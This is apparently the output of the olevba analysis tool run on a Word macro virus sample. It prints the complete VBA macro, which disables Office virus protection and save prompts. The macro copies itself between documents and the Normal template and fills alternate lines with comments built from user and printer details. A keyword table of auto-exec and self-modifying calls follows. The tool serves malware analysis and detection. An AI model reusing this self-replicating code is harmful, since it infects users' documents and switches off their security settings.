olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-fd24d8ebeeaeb4f7968d4bd976717cc8e41c660a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-fd24d8ebeeaeb4f7968d4bd976717cc8e41c660a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
On Error Resume Next
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
Options.SaveNormalPrompt = 0
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
Application.EnableCancelKey = 0
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
RC24 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
Options.ConfirmConversions = 0
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
Options.VirusProtection = 0
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
CO49 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
If CO49 > 0 And RC24 > 0 Then GoTo JO36
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
If CO49 = 0 Then
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
Set KT74 = ActiveDocument.VBProject.VBComponents.Item(1)
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
IH6 = True
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
End If
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
If RC24 = 0 Then
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
Set KT74 = NormalTemplate.VBProject.VBComponents.Item(1)
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
FV52 = True
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
End If
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
If FV52 <> True And IH6 <> True Then GoTo JO36
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
If FV52 = True Then KT74.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CO49 - 1))
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
If IH6 = True Then KT74.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RC24 - 1))
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
With KT74.CodeModule
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
For x = 2 To (KT74.CodeModule.CountOfLines - 1) Step 2
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
Next x
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
End With
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
JO36:
'Andreas MarxAMdok1dok1.docHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:38:46
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

